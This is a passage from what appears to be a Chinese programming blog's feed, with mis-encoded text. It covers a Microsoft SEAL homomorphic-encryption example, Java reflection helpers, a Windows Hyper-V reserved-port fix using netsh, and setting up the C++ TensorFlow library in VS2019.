"</span> <span class="token operator">&lt;&lt;</span> x_squared<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>x_squared<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// é‡æ–°çº¿æ€§åŒ–å¤§å°åˆ°2ä»¥å†…</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of x_squared (after relinearization): "</span> <span class="token operator">&lt;&lt;</span> x_squared<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>     evaluator<span class="token punctuation">.</span><span class="token function">add_plain</span><span class="token punctuation">(</span>x_squared<span class="token punctuation">,</span> plain_one<span class="token punctuation">,</span> x_sq_plus_one<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// x_sq_plus_one = x_squared +  plain_one;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in x_sq_plus_one: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + decryption of x_sq_plus_one: "</span><span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> decrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2 <span class="token operator">&lt;&lt;</span> hex <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2 <span class="token operator">>></span> d2<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hex: 0x"</span> <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" Integer: "</span><span class="token operator">&lt;&lt;</span>d2<span class="token operator">&lt;&lt;</span><span class="token string">" ...... Correct. (x^2 + 1 ) "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Ciphertext x_plus_one<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute x_plus_one (x+1),"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"then compute and relinearize x_plus_one_sq ((x+1)^2)."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">add_plain</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> plain_one<span class="token punctuation">,</span> x_plus_one<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// x_plus_one = x_encrypted +  plain_one;</span>    evaluator<span class="token punctuation">.</span><span class="token function">square</span><span class="token punctuation">(</span>x_plus_one<span class="token punctuation">,</span> x_plus_one_sq<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// x_plus_one_sq =  x_plus_one * x_plus_one;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of x_plus_one_sq: "</span> <span class="token operator">&lt;&lt;</span> x_plus_one_sq<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>x_plus_one_sq<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å¤§å°çº¿æ€§ä¼˜åŒ–åˆ°2å†…</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in x_plus_one_sq: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>x_plus_one_sq<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + decryption of x_plus_one_sq: "</span><span class="token punctuation">;</span>    ss3<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>x_plus_one_sq<span class="token punctuation">,</span> decrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    ss3<span class="token operator">&lt;&lt;</span> hex <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss3 <span class="token operator">>></span> d2<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hex: 0x"</span> <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" Integer: "</span><span class="token operator">&lt;&lt;</span>d2<span class="token operator">&lt;&lt;</span><span class="token string">" ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute and relinearize encrypted_result (4(x^2+1)(x+1)^2)."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">multiply_plain_inplace</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> plain_four<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//  x_sq_plus_one = x_sq_plus_one * plain_four</span>    evaluator<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> x_plus_one_sq<span class="token punctuation">,</span> encrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// encrypted_result = x_sq_plus_one * x_plus_one_sq</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of encrypted_result: "</span> <span class="token operator">&lt;&lt;</span> encrypted_result<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted_result<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// çº¿æ€§ä¼˜åŒ–</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of encrypted_result (after relinearization): "</span> <span class="token operator">&lt;&lt;</span> encrypted_result<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in encrypted_result: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_result<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"NOTE: Notice the increase in remaining noise budget."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Decrypt encrypted_result (4(x^2+1)(x+1)^2)."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    ss3<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_result<span class="token punctuation">,</span> decrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    ss3 <span class="token operator">&lt;&lt;</span> hex <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss3 <span class="token operator">>></span> d2<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + decryption of 4(x^2+1)(x+1)^2 ,after Mod = Hex: 0x"</span> <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">&lt;&lt;</span> <span class="token string">" Integer:"</span> <span class="token operator">&lt;&lt;</span> d2 <span class="token operator">&lt;&lt;</span> <span class="token string">" ...... Correct.(4(x^2+1)(x+1)^2)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * å¯¹äº x=6, 4(x^2+1)(x+1)^2 = 7252. å› ä¸º plaintext modulus MODè¢«è®¾ç½®ä¸º 1024,    * æ‰€ä»¥ç»“æœ%1024.æ•… 7252 % 1024 == 84, æˆ–è€…16è¿›åˆ¶ï¼š 0x54     */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"An example of invalid parameters"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    context <span class="token operator">=</span> <span class="token function">SEALContext</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_parameters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Parameter validation (failed): "</span> <span class="token operator">&lt;&lt;</span> context<span class="token punctuation">.</span><span class="token function">parameter_error_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092836.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092836.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092827578"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Microsoft SEAL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seal </tag>
            
            <tag> åŒæ€åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåå°„æŠ€æœ¯æ‹¿å–å’Œè®¾ç½®Objectå®ä½“ç±»ä¸­çš„å±æ€§</title>
      <link href="/posts/c57ba29d/"/>
      <url>/posts/c57ba29d/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>@auther by sizaif</p></blockquote><h1>è¯´æ˜</h1><p><strong>åœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­ä½¿ç”¨PageHelperæ’ä»¶æ‹¿åˆ°çš„æ•°æ®å°è£…åœ¨ PageInfoä¸­,è€ŒæŸäº›æ“ä½œéœ€è¦æ‹¿åˆ°é‡Œé¢çš„å€¼å’Œè®¾ç½®ä¸€äº›å€¼,ç”±äºObjectçš„ç¼˜æ•…,æ— æ³•ç›´æ¥getå’Œset,æ‰€æœ‰ä½¿ç”¨javaåå°„æ¥getå’Œset</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Object</span> contestVO <span class="token operator">:</span> pageInfo<span class="token punctuation">.</span><span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>XXXXX<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><h1>æ‹¿å±æ€§çš„å€¼</h1><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">/** * æ ¹æ®å±æ€§åè·å–å±æ€§å€¼ * * @param è¦æ‹¿å–çš„å±æ€§çš„åç§° * @param å®ä½“ç±» * @return */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getFieldValueByFieldName</span><span class="token punctuation">(</span><span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> object<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//è®¾ç½®å¯¹è±¡çš„è®¿é—®æƒé™ï¼Œä¿è¯å¯¹privateçš„å±æ€§çš„è®¿é—®</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span>  <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h1>è®¾ç½®</h1><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">/** * æ ¹æ®å±æ€§åè®¾ç½®å±æ€§å€¼ * * @param è¦è®¾ç½®çš„å±æ€§åç§° * @param å®ä½“ç±» * @param å¯¹äºè¦è®¾ç½®çš„å±æ€§ç±»å‹ * @return */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValueByFieldName</span><span class="token punctuation">(</span><span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> object<span class="token punctuation">,</span> å¯¹äºè¦è®¾ç½®çš„å±æ€§ç±»å‹ value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// è·å–objç±»çš„å­—èŠ‚æ–‡ä»¶å¯¹è±¡</span>        <span class="token class-name">Class</span> aClass <span class="token operator">=</span> object<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è·å–è¯¥ç±»çš„æˆå‘˜å˜é‡</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// å–æ¶ˆè¯­è¨€è®¿é—®æ£€æŸ¥</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ç»™å˜é‡èµ‹å€¼</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³ Win10 Hyper-v ä¿ç•™ç«¯å£å ç”¨é—®é¢˜</title>
      <link href="/posts/f8215b18/"/>
      <url>/posts/f8215b18/</url>
      
        <content type="html"><![CDATA[<h1>è§£å†³ win10 hyper-v ä¿ç•™ç«¯å£å ç”¨é—®é¢˜</h1><p>[TOC]</p><h2 id="æŸ¥æ‰¾é—®é¢˜">æŸ¥æ‰¾é—®é¢˜</h2><div class="story post-story"><p>é¦–å…ˆï¼Œæ£€æŸ¥ç«¯å£å ç”¨</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># powershell</span>netstat <span class="token operator">-</span>ano <span class="token punctuation">|</span> findstr <span class="token string">":8080"</span></code></pre><p>æ²¡æœ‰ç»“æœï¼Œæ„å‘³ç€å¹¶ä¸æ˜¯æœ‰ç¨‹åºå ç”¨äº†ç«¯å£ã€‚</p><p>çŒœæµ‹å¯èƒ½æ˜¯æ›´æ–°äº†win10 2004ï¼Œå¯¼è‡´win10é˜²ç«å¢™é…ç½®æœ‰å˜æ›´ï¼Œåˆæ£€æŸ¥äº†ä¸€ç•ªwin10é˜²ç«å¢™ï¼Œå‘ç°å¹¶æ²¡æœ‰æ‹¦æˆªæˆ–è€…ç«¯å£ç¦ç”¨çš„é…ç½®ã€‚æ­¤æ—¶ï¼Œæˆ‘æ‰æƒ³èµ·å¥½åƒå…ˆå‰å¼€å¯äº†hyper-vï¼Œæœ€åæœç´¢äº†ä¸€ç•ªï¼Œæ‰¾åˆ°äº†å‡ºç°é—®é¢˜çš„åœ°æ–¹ï¼š</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># powershell </span><span class="token comment"># æŸ¥çœ‹ç³»ç»Ÿé»˜è®¤ç«¯å£å ç”¨è®¿é—®</span>netsh int ipv4 show dynamicport tcp åè®® tcp åŠ¨æ€ç«¯å£èŒƒå›´<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span><span class="token operator">-</span>å¯åŠ¨ç«¯å£        : 1024ç«¯å£æ•°          : 13977<span class="token comment"># æŸ¥çœ‹hyper-vå¯åŠ¨åçš„ä¿ç•™ç«¯å£èŒƒå›´</span>netsh interface ipv4 show excludedportrange protocol=tcpåè®® tcp ç«¯å£æ’é™¤èŒƒå›´ å¼€å§‹ç«¯å£    ç»“æŸç«¯å£<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>    <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>      1026        1125      1226        1325      1326        1425      1426        1525      1526        1625      2180        2279<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment"># é€šè¿‡è¿™ä¸ªå¯ä»¥æŸ¥çœ‹è¢«å ç”¨çš„é¡¹ç›®ç«¯å£æ˜¯å¦åœ¨è¿™ä¸ªèŒƒå›´å†…</span></code></pre>              </div>            </details></div><h2 id="è§£å†³åŠæ³•">è§£å†³åŠæ³•</h2><div class="story post-story"><ol><li>ç”±äºç›´æ¥è¿›è¡Œç¬¬äºŒæ­¥é…ç½®ï¼Œä¼šé‡åˆ°ç¨‹åºå ç”¨(hyper-vå ç”¨)ï¼Œæ‰€ä»¥éœ€è¦å…ˆå…³é—­hyper-vï¼Œ å¯ä»¥win+s å¿«æ·é”®æœç´¢ â€œwindowsåŠŸèƒ½â€ ï¼Œå…³é—­hyper-vï¼Œæˆ–è€…ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤ï¼Œç„¶åé‡å¯</li></ol><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># powershell / cmd</span>dism<span class="token punctuation">.</span>exe <span class="token operator">/</span>Online <span class="token operator">/</span><span class="token function">Disable-Feature</span>:Microsoft<span class="token operator">-</span>Hyper<span class="token operator">-</span>V</code></pre><ol><li>é…ç½®ipv4åŠ¨æ€ç«¯å£ /  æˆ–è€…é…ç½®éœ€è¦çš„ç«¯å£ä¸è¢«å ç”¨</li></ol><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># powershell / cmd ç®¡ç†å‘˜æƒé™</span><span class="token comment"># start èµ·å§‹ç«¯å£  num è¡¨ç¤ºå¯ç”¨ç«¯å£æ•°     æŒ‰è‡ªå·±çš„éœ€æ±‚æ¥</span>netsh int ipv4 <span class="token function">set</span> dynamicport tcp <span class="token function">start</span>=30000 num=16383<span class="token comment"># æ’é™¤ipv4åŠ¨æ€ç«¯å£å ç”¨ startport èµ·å§‹ç«¯å£ numberofports ç«¯å£æ•°</span>netsh int ipv4 add excludedportrange protocol=tcp startport=50051 numberofports=1</code></pre><ol><li>é‡å¯hyper-v</li></ol><p>å‘½ä»¤æˆ–é…ç½®çª—å£(å‚è€ƒ1</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">dism<span class="token punctuation">.</span>exe <span class="token operator">/</span>Online <span class="token operator">/</span><span class="token function">Enable-Feature</span>:Microsoft<span class="token operator">-</span>Hyper<span class="token operator">-</span>V <span class="token operator">/</span>All</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Win </tag>
            
            <tag> Hyper-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VS2019å¹³å°å¼•å…¥C++ç‰ˆtensorflowé‡åˆ°çš„ä¸€äº›é—®é¢˜åŠè§£å†³æ–¹æ³•</title>
      <link href="/posts/54fe9f8f/"/>
      <url>/posts/54fe9f8f/</url>
      
        <content type="html"><![CDATA[<h1>VS2019å¹³å°å¼•å…¥C++ç‰ˆtensorflowé‡åˆ°çš„ä¸€äº›é—®é¢˜åŠè§£å†³æ–¹æ³•</h1><p>[TOC]</p><h2 id="å®‰è£…tensorflow">å®‰è£…tensorflow</h2><div class="story post-story"><p>æˆ‘é‡‡ç”¨çš„æ˜¯å·²ç¼–è¯‘å¥½çš„tensorflow</p><h3 id="ä¸‹è½½tensorflow">ä¸‹è½½tensorflow</h3><p><a href="https://github.com/fo40225/tensorflow-windows-wheel">https://github.com/fo40225/tensorflow-windows-wheel</a></p><blockquote><p>æ³¨æ„:</p><p>è¿™é‡Œé¢åªæœ‰tensorflow1.7<sub>1.10çš„ç‰ˆæœ¬æœ‰ç¼–è¯‘å¥½çš„cppåº“ï¼Œå…¶ä»–çš„ç‰ˆæœ¬åªæœ‰ç¼–è¯‘å¥½çš„å®‰è£…tfçš„pythonåº“çš„whlæ–‡ä»¶ï¼Œæ‰€ä»¥å¼ºçƒˆæ¨èå¤§å®¶ç”¨1.7</sub>1.10çš„tensorflowã€‚</p><p>ä¾‹å¦‚æˆ‘éœ€è¦tensorflow1.10çš„ã€cpuæ”¯æŒAVX2æŒ‡ä»¤é›†çš„ç‰ˆæœ¬ï¼Œå°±ä¸‹è½½tensorflow-windows-wheel/1.10.0/cpp/libtensorflow-cpu-windows-x86_64-1.10.0-avx2.7z</p><p>ä¾‹å¦‚æˆ‘éœ€è¦tensorflow1.10çš„ã€cpuæ”¯æŒSSE2æŒ‡ä»¤é›†ã€ä¸”gpuæ”¯æŒCUDA9.2å’ŒCUDNN7.2çš„ç‰ˆæœ¬ï¼Œå°±ä¸‹è½½tensorflow-windows-wheel/1.10.0/cpp/libtensorflow-gpu-windows-x86_64-1.10.0-sse2cuda92cudnn72.7z</p><p>ç„¶åæŠŠå…¶ä¸­çš„includeè·¯å¾„åŒ…å«è¿›å»ï¼ŒæŠŠlibæ–‡ä»¶æ·»åŠ åˆ°å·¥ç¨‹ä¸­ï¼Œå†åœ¨æ‰§è¡Œexeæ—¶æŠŠdllæ–‡ä»¶å¤åˆ¶è¿›å»å°±å¥½äº†<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œ_æ²¥å·å¾€äº‹ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/yuejisuo1948/article/details/84197534">https://blog.csdn.net/yuejisuo1948/article/details/84197534</a></p></blockquote><h3 id="å¼•å…¥tensorflow">å¼•å…¥tensorflow</h3><p>åœ¨cmakelist.txtä¸­å†™å…¥ï¼›</p><pre class="language-none"><code class="language-none">include_directories(&lt;Your Path&gt;&#x2F;tensorflow&#x2F;include)link_directories(&lt;Your Path&gt;&#x2F;tensorflow&#x2F;lib)target_link_libraries(&lt;Your exe name&gt; tensorflow)</code></pre></div><h2 id="é‡åˆ°çš„é—®é¢˜">é‡åˆ°çš„é—®é¢˜:</h2><div class="story post-story"><h3 id="1-â€œ-â€-â€œ-â€å³è¾¹çš„éæ³•æ ‡è®°åº”è¾“å…¥æ ‡è®°ç¬¦">1. â€œ(â€:â€œ::â€å³è¾¹çš„éæ³•æ ‡è®°åº”è¾“å…¥æ ‡è®°ç¬¦</h3><p>åŸå› å¤„åœ¨vcå’Œc++æ¨¡æ¿åº“ä¸Š.minå’Œmaxä¸&lt;windows.h&gt;ä¸­ä¼ ç»Ÿçš„min/maxå®å®šä¹‰æœ‰å†²çª</p><p>åœ¨å±æ€§-&gt;C/C+Â±&gt;é¢„å¤„ç†å™¨-&gt; é¢„å¤„ç†å®šä¹‰ä¸­ æ·»åŠ <strong>NOMINMAX</strong></p><p><strong>è§£å†³æ–¹æ³•:</strong></p><img src="https://gitee.com/sizaif/images/raw/master/img/20210228151125.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210228151125.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210228151125411" style="zoom:50%;" /><img src="https://gitee.com/sizaif/images/raw/master/img/20210228151146.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210228151146.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210228151146594" style="zoom:50%;" /><h3 id="2-æ‰¾ä¸åˆ°tensorflow-dll">2.æ‰¾ä¸åˆ°tensorflow.dll</h3><img src="https://gitee.com/sizaif/images/raw/master/img/20210228151404.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210228151404.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210228151404078" style="zoom:80%;" /><p><strong>è§£å†³æ–¹æ³•:</strong></p><p>==å°†å·²ç¼–è¯‘å¥½çš„tensorflowçš„binç›®å½•ä¸‹ tensorflow.dll å¤åˆ¶åˆ° 